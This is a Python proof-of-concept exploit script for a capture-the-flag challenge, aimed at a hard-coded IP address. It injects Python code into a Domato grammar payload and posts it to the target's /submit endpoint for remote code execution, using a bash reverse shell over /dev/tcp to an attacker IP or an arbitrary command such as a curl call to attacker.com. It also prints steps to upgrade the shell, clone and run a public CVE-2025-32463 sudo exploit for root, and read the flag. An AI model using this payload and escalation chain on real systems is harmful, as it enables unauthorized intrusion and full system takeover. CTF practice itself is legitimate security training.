#!/usr/bin/env python3
"""
PoC Exploit for marlowww CTF Challenge
Author: Based on solution by user
Challenge: RCE via Domato Python Function Injection + Sudo CVE-2025-32463
Target: http://84.247.129.120:13370
"""

import requests
import argparse
import sys
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Banner
BANNER = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════╗
║           marlowww CTF Challenge PoC Exploit          ║
║                                                       ║
║  [*] Domato Python Function Injection → RCE          ║
║  [*] Sudo CVE-2025-32463 → Privilege Escalation      ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

class MarlowExploit:
    def __init__(self, target_url, attacker_ip, attacker_port):
        self.target_url = target_url.rstrip('/')
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.session = requests.Session()
        
    def log_info(self, message):
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {message}")
        
    def log_success(self, message):
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")
        
    def log_error(self, message):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")
        
    def log_warning(self, message):
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")

    def generate_reverse_shell_payload(self):
        """
        Generate Domato grammar payload with Python function injection
        for reverse shell (runs in background to avoid timeout)
        """
        payload = f"""!begin function revshell
import os
os.system("echo 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1' > /tmp/r.sh && bash /tmp/r.sh &")
!end function
!begin lines
<call function=revshell>
!end lines
<EOF>"""
        return payload

    def generate_command_execution_payload(self, command):
        """
        Generate Domato grammar payload for command execution
        (useful for testing or direct flag reading)
        """
        payload = f"""!begin function rce
import os
os.system("{command}")
!end function
!begin lines
<call function=rce>
!end lines
<EOF>"""
        return payload

    def send_payload(self, payload):
        """
        Send the malicious grammar payload to the target
        """
        try:
            self.log_info(f"Sending payload to {self.target_url}/submit")
            
            # Prepare the payload as form data
            data = {
                'payload': payload
            }
            
            # Send POST request
            response = self.session.post(
                f"{self.target_url}/submit",
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                self.log_success("Payload sent successfully!")
                return True
            else:
                self.log_error(f"Unexpected status code: {response.status_code}")
                return False
                
        except requests.exceptions.Timeout:
            self.log_warning("Request timed out (this is expected if reverse shell connected)")
            return True
        except requests.exceptions.ConnectionError:
            self.log_error("Connection error - is the target up?")
            return False
        except Exception as e:
            self.log_error(f"Error sending payload: {str(e)}")
            return False

    def exploit_reverse_shell(self):
        """
        Main exploit function - sends reverse shell payload
        """
        print(BANNER)
        
        self.log_info(f"Target: {self.target_url}")
        self.log_info(f"Attacker IP: {self.attacker_ip}")
        self.log_info(f"Attacker Port: {self.attacker_port}")
        print()
        
        # Generate payload
        self.log_info("Generating malicious Domato grammar payload...")
        payload = self.generate_reverse_shell_payload()
        
        print(f"\n{Fore.CYAN}[PAYLOAD]{Style.RESET_ALL}")
        print("-" * 60)
        print(payload)
        print("-" * 60)
        print()
        
        # Remind to start listener
        self.log_warning(f"Make sure your listener is running:")
        print(f"    {Fore.YELLOW}nc -lvnp {self.attacker_port}{Style.RESET_ALL}")
        print()
        
        input(f"{Fore.CYAN}Press Enter when ready to send exploit...{Style.RESET_ALL}")
        
        # Send exploit
        if self.send_payload(payload):
            self.log_success("Exploit sent! Check your listener for incoming connection.")
            print()
            self.log_info("Once you have a shell, upgrade it with:")
            print(f"    {Fore.CYAN}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'{Style.RESET_ALL}")
            print()
            self.log_info("Then escalate privileges with CVE-2025-32463:")
            print(f"    {Fore.CYAN}git clone https://github.com/kh4sh3i/CVE-2025-32463.git{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}cd CVE-2025-32463{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}chmod +x exploit.sh{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}./exploit.sh{Style.RESET_ALL}")
            print()
            self.log_info("Finally, read the flag:")
            print(f"    {Fore.CYAN}cat /root/flag{Style.RESET_ALL}")
            
        else:
            self.log_error("Failed to send exploit")
            return False
        
        return True

    def test_rce(self, command):
        """
        Test RCE with a simple command (useful for debugging)
        """
        print(BANNER)
        self.log_info(f"Testing RCE with command: {command}")
        
        payload = self.generate_command_execution_payload(command)
        
        print(f"\n{Fore.CYAN}[PAYLOAD]{Style.RESET_ALL}")
        print("-" * 60)
        print(payload)
        print("-" * 60)
        print()
        
        return self.send_payload(payload)


def main():
    parser = argparse.ArgumentParser(
        description='PoC Exploit for marlowww CTF Challenge',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Standard reverse shell exploit
  python3 poc.py -t http://84.247.129.120:13370 -i YOUR_IP -p YOUR_PORT
  
  # Test RCE with a command
  python3 poc.py -t http://84.247.129.120:13370 -i YOUR_IP -p YOUR_PORT --test "whoami"
  
  # Use custom command
  python3 poc.py -t http://84.247.129.120:13370 -i YOUR_IP -p YOUR_PORT --cmd "curl http://attacker.com"

Notes:
  1. Start your netcat listener BEFORE running this script:
     nc -lvnp YOUR_PORT
     
  2. Once you get a shell, upgrade it:
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     
  3. Escalate to root using CVE-2025-32463:
     git clone https://github.com/kh4sh3i/CVE-2025-32463.git
     cd CVE-2025-32463
     chmod +x exploit.sh
     ./exploit.sh
     
  4. Read the flag:
     cat /root/flag
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                        help='Target URL (e.g., http://84.247.129.120:13370)')
    parser.add_argument('-i', '--ip', required=True,
                        help='Your IP address for reverse shell')
    parser.add_argument('-p', '--port', type=int, required=True,
                        help='Your port for reverse shell (e.g., YOUR_PORT)')
    parser.add_argument('--test', metavar='CMD',
                        help='Test RCE with a simple command instead of reverse shell')
    parser.add_argument('--cmd', metavar='COMMAND',
                        help='Execute custom command (for advanced usage)')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = MarlowExploit(args.target, args.ip, args.port)
    
    # Run appropriate exploit mode
    if args.test:
        # Test mode
        exploit.test_rce(args.test)
    elif args.cmd:
        # Custom command mode
        exploit.test_rce(args.cmd)
    else:
        # Standard reverse shell mode
        exploit.exploit_reverse_shell()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!]{Style.RESET_ALL} Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {str(e)}")
        sys.exit(1)
